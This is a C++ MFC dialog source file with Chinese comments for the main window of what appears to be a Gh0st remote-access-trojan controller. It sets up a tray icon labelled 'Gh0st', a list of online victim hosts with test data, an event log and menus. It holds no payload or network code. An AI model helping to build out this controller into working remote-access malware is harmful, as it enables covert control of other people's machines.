
// UIDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "UI.h"
#include "UIDlg.h"
#include "afxdialogex.h"
#include "CSettingDlg.h"
#include "macros.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CUIDlg 对话框



CUIDlg::CUIDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_UI_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hMenu = nullptr;
	m_nWndWidth = NULL;
	ZeroMemory(&m_nifNotify, sizeof(m_nifNotify));
}

// 加载UI
void CUIDlg::LoadUI()
{
	InitMainMenu();
	InitToolBar();
	InitOnlineListCtrl();
	InitEventLogListCtrl();
	InitStatusBar();
	InitNotify();
}

// 主菜单
void CUIDlg::InitMainMenu()
{
	m_hMenu = LoadMenu(nullptr, MAKEINTRESOURCE(IDR_MAIN_MENU));
	::SetMenu(this->GetSafeHwnd(), m_hMenu);
	::DrawMenuBar(this->GetSafeHwnd());
}

// 真彩色图标工具栏
void CUIDlg::InitToolBar()
{
	// create and load toobar
	DWORD dwStyle = WS_CHILD | WS_VISIBLE | CBRS_TOP | CBRS_GRIPPER |
					CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC;
	if (!m_tcTooBar.CreateEx(this, TBSTYLE_FLAT, dwStyle) ||
		!m_tcTooBar.LoadToolBar(IDR_TOOLBAR_MAIN)) {
		return;
	}

	m_tcTooBar.LoadTrueColorToolBar(UI_BTNWIDTH,
									IDB_BITMAP_MAIN_TOOLBAR,
									IDB_BITMAP_MAIN_TOOLBAR,
									IDB_BITMAP_MAIN_TOOLBAR);

	// get window size and set main toolbar size
	RECT rWnd, rToolBar;
	GetWindowRect(&rWnd);
	rToolBar.left   = rToolBar.top = NULL;
	rToolBar.bottom = UI_MAIN_TOOLBAR_BOTTOM;
	rToolBar.right  = rWnd.right - rWnd.left + UI_BTNWIDTH_OFFSET;
	m_tcTooBar.MoveWindow(&rToolBar);

	// set toolbar button text
	for (INT i = 0; i < UI_BUTTON_COUNT; ++i) {
		if (UI_BUTTON_NULL != i) {
			m_tcTooBar.SetButtonText(i, ButtonTextArray[i]);
		}
	}
	
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, FALSE);
}

// 在线主机列表
void CUIDlg::InitOnlineListCtrl()
{
	m_lcOnline.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
		m_lcOnline.InsertColumn(i,
								g_uiOnlineColumn[i].chTitle,
								LVCFMT_CENTER,
								g_uiOnlineColumn[i].nWidth);
	}


	// test
	CString strColumn[] = { "127.0.0.1",
							"本地",
							"lenovo",
							"win10",
							"xen",
							"yes",
							"100M" };

	for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
		g_uiOnlineColumn[i].strContext = &strColumn[i];
	}
	AddOnline();
}


// 添加到上线列表
void CUIDlg::AddOnline()
{
	PUI_COLUMN pColumn = g_uiOnlineColumn;
	m_lcOnline.InsertItem(0, *(pColumn[0].strContext));

	for (INT i = 1; i < UI_ONLINE_COLUMNS; ++i) {
		m_lcOnline.SetItemText(0, i, *(pColumn[i].strContext));
	}
}


// 事件日志列表
void CUIDlg::InitEventLogListCtrl()
{
	m_lcEventLog.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
		m_lcEventLog.InsertColumn(i,
								g_uiEventLogColumn[i].chTitle,
								LVCFMT_CENTER,
								g_uiEventLogColumn[i].nWidth);

		// 计算窗口的宽度，用于当窗口大小发生变化时，列的宽度也随这改变
		m_nWndWidth += g_uiEventLogColumn[i].nWidth;
	}

	// test
	CString strColumn[] = { "成功",
							GetSystemTime(),
							"测试" };

	for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
		g_uiEventLogColumn[i].strContext = &strColumn[i];
	}
	AddEventLog();
}


// 添加到事件日志列表
void CUIDlg::AddEventLog()
{
	PUI_COLUMN pColumn = g_uiEventLogColumn;
	m_lcEventLog.InsertItem(0, *(pColumn[0].strContext));

	for (INT i = 1; i < UI_EVENTLOG_COLUMNS; ++i) {
		m_lcEventLog.SetItemText(0, i, *(pColumn[i].strContext));
	}
}


// 状态栏
void CUIDlg::InitStatusBar()
{
	UINT nIDCount = sizeof(g_nIndicators) / sizeof(UINT);
	if (!m_sbStatusBar.Create(this) ||
		!m_sbStatusBar.SetIndicators(g_nIndicators, nIDCount)) {
		return;
	}

	CRect r;
	::GetWindowRect(m_sbStatusBar.m_hWnd, r);
	m_sbStatusBar.MoveWindow(&r);
}


// 系统托盘显示
void CUIDlg::InitNotify()
{
	m_nifNotify.cbSize = sizeof(m_nifNotify);
	m_nifNotify.hWnd   = m_hWnd;
	m_nifNotify.uID = IDR_MAINFRAME;
	m_nifNotify.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	m_nifNotify.uCallbackMessage = UM_ICONNOTIFY;
	m_nifNotify.hIcon = m_hIcon;

	CString s = "Gh0st";
	if (!lstrcpyn(m_nifNotify.szTip, s, strlen(s))) {
		return;
	}

	Shell_NotifyIcon(NIM_ADD, &m_nifNotify);
}


// 获取系统时间
CString CUIDlg::GetSystemTime()
{
	CTime t = CTime::GetCurrentTime();

	return t.Format("%Y-%m-%d %H:%M:%S");
}

void CUIDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_ONLINE, m_lcOnline);
	DDX_Control(pDX, IDC_LIST_EVENT_LOG, m_lcEventLog);
}

BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()

	// 自定义消息处理
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT ( __thiscall CWnd::* )(WPARAM, LPARAM))&CUIDlg::OnIconNotify)

	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
	ON_NOTIFY((WORD)NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
END_MESSAGE_MAP()


// CUIDlg 消息处理程序

BOOL CUIDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// 加载UI
	LoadUI();

	// 改变窗口的大小，触发窗口onsize()
	CRect r;
	GetWindowRect(&r);
	r.top += 1;
	MoveWindow(&r);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}


void CUIDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CUIDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}


//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CUIDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


// 指示窗口大小的更改
void CUIDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	CRect rOnSize;

	if (m_tcTooBar.m_hWnd) {
		rOnSize.top    = rOnSize.left = NULL;
		rOnSize.right  = cx;
		rOnSize.bottom = UI_MAIN_TOOLBAR_BOTTOM;

		m_tcTooBar.MoveWindow(&rOnSize);
	}

	if (m_lcOnline.m_hWnd) {
		rOnSize.left   = UI_ONLINE_LEFT;
		rOnSize.top    = UI_ONLINE_TOP;
		rOnSize.right  = cx - UI_ONLINE_RIGHT;
		rOnSize.bottom = cy - UI_ONLINE_BOTTOM;

		m_lcOnline.MoveWindow(&rOnSize);

		// 按原来的比例缩放列表的宽度
		for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
			DOUBLE w = g_uiOnlineColumn[i].nWidth;
			w /= m_nWndWidth;
			w *= cx;
			m_lcOnline.SetColumnWidth(i, (int)w);
		}
	}

	if (m_lcEventLog.m_hWnd) {
		rOnSize.left   = UI_EVENTLOG_LEFT;
		rOnSize.top    = cy - UI_EVENTLOG_TOP;
		rOnSize.right  = cx - UI_EVENTLOG_RIGHT;
		rOnSize.bottom = cy - UI_EVENTLOG_BOTTOM;

		m_lcEventLog.MoveWindow(&rOnSize);

		// 按原来的比例缩放列表的宽度
		for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
			DOUBLE w = g_uiEventLogColumn[i].nWidth;
			w /= m_nWndWidth;
			w *= cx;
			m_lcEventLog.SetColumnWidth(i, (int)w);
		}
	}

	if (m_sbStatusBar.m_hWnd) {
		rOnSize.top    = cy - UI_STATUSBAR_TOP;
		rOnSize.right  = cx;
		rOnSize.left   = NULL;
		rOnSize.bottom = cy;

		m_sbStatusBar.MoveWindow(&rOnSize);
		m_sbStatusBar.SetPaneInfo(0,
								m_sbStatusBar.GetItemID(0),
								SBPS_POPOUT,
								cx - UI_STATUSBAR_OFFSET);
	}
}


// 系统托盘消息处理
void CUIDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
		if (!IsWindowVisible()) {
			ShowWindow(SW_SHOW);
		} else {
			ShowWindow(SW_HIDE);
		}
		break;

	case WM_RBUTTONDOWN:
	{
		CMenu mNotify;
		CPoint p;

		mNotify.LoadMenu(IDR_MENU_NOTIFY);
		GetCursorPos(&p);
		SetForegroundWindow();
		mNotify.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON|TPM_RIGHTBUTTON,
												p.x, p.y,this, NULL);
		PostMessage(WM_USER);
		break;
	}

	default:
		break;
	}
}


// 参数设置
void CUIDlg::OnMainSetting()
{
	CSettingDlg dlg;
	dlg.DoModal();
}


// 退出
void CUIDlg::OnMianClose()
{
	PostMessage(WM_CLOSE);
}


// 用户在控件online内单击鼠标右键
void CUIDlg::OnNMRClickListOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	CMenu popup, *pSub;
	CPoint p;

	popup.LoadMenu(IDR_MENU_LBUTTON);
	pSub = popup.GetSubMenu(0);
	GetCursorPos(&p);
	UINT nSubCount = pSub->GetMenuItemCount();

	// 没有列被选中时菜单显示灰色并不可用
	if (m_lcOnline.GetSelectedCount() == NULL) {
		for (UINT i = 0; i < nSubCount; ++i) {
			pSub->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
	pSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}
